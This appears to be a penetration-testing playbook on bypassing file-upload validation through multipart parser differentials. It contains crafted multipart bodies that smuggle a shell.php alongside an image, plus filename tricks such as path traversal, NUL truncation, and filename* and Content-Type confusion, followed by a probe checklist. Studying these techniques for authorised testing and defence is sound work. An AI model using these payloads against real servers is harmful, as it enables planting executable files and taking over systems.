# Parser Differentials — multipart, filename, and check-vs-store splits

## The model — the bug is never "the filter", it's two parsers disagreeing

```
request bytes → multipart parser → fields{name, filename, content-type, body}
              → validator reads SOME of them
              → storer/consumer reads (possibly different) ones
```

Anything the validator sees differently than the storer is a bypass.

## Multipart-level tricks

### Two files, one name

```
--B
Content-Disposition: form-data; name="file"; filename="ok.png"
Content-Type: image/png

<real png>
--B
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png

<?php ... ?>
--B--
```

Frameworks differ: PHP `$_FILES['file']` takes the LAST part; multer's
`upload.single('file')` takes the FIRST; some validators check the first
while the store writes the last. Send both orders.

### `filename` vs `filename*` (RFC 5987/6266)

```
Content-Disposition: form-data; name="f"; filename="ok.png";
    filename*=UTF-8''shell.php
```

Compliant parsers prefer `filename*`; naive ones take `filename`. If the
validator reads `filename` but the store honors `filename*`, the stored
name differs from the checked name. Reverse direction too.

### Quoted-string escapes in filename

```
filename="x.php\".png"          # escaped quote — parser split changes
filename="x.php\
.png"                          # continuation line folding (obs-fold)
filename=x.php;.png             # unquoted with semicolon params
filename*=UTF-8''x%2Ephp        # encoded-dot variant
filename="x.php \"; .png"       # quote games
```

### Double Content-Type / missing pieces

```
Content-Disposition: form-data; name="f"; filename="x.php"
Content-Type: application/x-php
Content-Type: image/jpeg        # second header — which wins?

Content-Type:                    # empty — default vs reject
(no content-type line at all)    # sniffing path vs header path
```

### Boundary games

- `boundary=B` declared, parts delimited by `B` vs ` B ` whitespace —
  tolerant parsers accept, strict ones 400
- early `--B--` end + trailing parts — does the tail become a field?
- `Content-Type: multipart/form-data; boundary` missing → form-urlencoded
  fallback — the upload becomes a string field some apps still write
- chunked Transfer-Encoding on the multipart — some validators read only
  the first chunk

### Field-name casing / duplicates

- `name="FILE"` vs `name="file"` — validator maps case-sensitively, store
  case-insensitively (or vice versa)
- `name="file[]"` array vs `name="file"` — which is stored?
- a second `filename` in the SAME part header — first wins or last wins
  per parser

## The check-vs-store matrix — enumerate what each side reads

| Validator reads | Store uses | Attack |
|---|---|---|
| `filename` ext | `filename` ext | standard — `extension-bypass.md` |
| `filename` ext | `filename*` name | send ok.png + `filename*=x.php` |
| content-type header | sniffed type | header spoof — `mime-bypass.md` |
| sniffed type | stored name ext | polyglot — `polyglot-files.md` |
| first part | last part | two files one name |
| last part | first part | same, reversed |
| `file` field | `files[]` field | name-shape confusion |
| body content | filename content | split the malicious parts across fields |

## URL-encoding and charset inside filename

- `filename="..%2f..%2fx.php"` — decoded if the pipeline urldecodes
- `filename*="UTF-8''..%2fx.php"` — the RFC 5987 form decodes `%` by spec
- `filename="x\uFF0Ephp"` (fullwidth dot) — NFKC normalization yields `.`
- `filename="x%00.php"` — NUL truncation on old parsers
- `filename="?.php"` where `?` lands as a high-byte — charset confusion
- UTF-16 surrogate/encoded filename on parsers that decode it

## Streaming-parser quirks

- formidable/busboy emit `fileBegin`/`part` events — a validator that runs
  on `part` headers may pass before the body completes; race the write
- multer memory-storage vs disk-storage — filename handling differs per
  storage engine
- PHP `php://input` — multipart parsed once; a second parse by the app
  sees nothing (raw-body re-reads differ)
- request size limits hit the *request*, not the file — pad a different
  field to push the file past the validator's read window while the store
  still gets it

## Form field confusion — the file goes to a text field

Send the file bytes in a normal `name="x"` field with no `filename` —
some apps write field values to disk (import endpoints); send the text
value WITH a filename= — some apps skip `filename`-less parts only in
validators, not in the writer.

## The body-level divergence — chunked/CL disagreements

`Content-Length` vs chunked desync belongs to `web-request-smuggling` —
but the *multipart* level has its own: trailing bytes after `--B--` may
be parsed as another part by a lenient store while the validator stopped.

## White-box grep — find the exact parser pair

```bash
grep -rn "multer\|busboy\|formidable\|MultipartFile\|request.FILES\|\$_FILES\|IFormFile\|parse_multipart\|cgi.FieldStorage" .
# then read BOTH the validator call AND the store path
```

## Probe checklist

```
□ two parts, same name, swapped order — which is stored?
□ filename + filename* together — which name lands?
□ two Content-Type lines in one part
□ no Content-Type on the part
□ boundary with whitespace; --B-- mid-body
□ filename escapes/continuations
□ field without filename= carrying file bytes
□ filename with %2f / fullwidth-dot / NUL
```

## Falsifiers

- validator and store demonstrably read the same parsed fields (source)
- both filename forms reach the same stored name (probe)
- every parser-level confusion produces a 400, not a split

## Output to record

- the parser pair identified (validator reads X, store writes Y)
- the exact malformed part that produced the split
